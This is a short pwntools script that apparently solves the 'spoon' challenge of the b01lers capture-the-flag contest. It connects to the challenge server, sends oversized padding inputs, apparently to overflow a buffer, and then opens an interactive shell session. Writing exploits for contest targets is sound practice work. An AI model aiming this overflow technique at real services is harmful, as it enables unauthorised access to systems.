#!/usr/bin/python3
from pwn import *
from past.builtins import xrange
from time import sleep
import random

if __name__ == '__main__':
#	io = process('./spoon')
	io = remote('chal.ctf.b01lers.com',1006)
	matrix = '\x00'+'A'*255
	io.sendafter('your matrix: ',matrix)
	io.sendafter('choice: ','A'*0x50)
	io.interactive()
